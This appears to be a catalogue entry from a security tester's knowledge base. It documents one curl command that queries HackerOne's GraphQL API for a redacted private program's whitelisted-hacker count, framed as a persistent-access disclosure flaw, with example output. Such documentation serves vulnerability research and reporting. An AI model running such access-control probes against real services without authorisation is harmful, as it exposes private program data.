---
id: cmd-graphql-left
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query
  {team(handle:\"████████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
tags:
  - graphql
  - left-program
type: command
output: >-
  {"data":{"team":{"id":"███████","name":"█████","handle":"████","whitelisted_hackers":{"total_count":551}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.107Z'
verified: false
validated: true
submitted: true
---
# graphql-query-left-program

## Command

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"████████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

## Description

Discloses whitelisted count for a previously left program, showing persistent access flaw.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d '{...}'` | JSON with redacted left program handle | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"████████\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

## Expected Output

JSON with total_count:551.

## Related

- [[commands/graphql-query-private-program]]
- [[procedures/Test-Whitelisted-Hackers-on-Program-Types]]
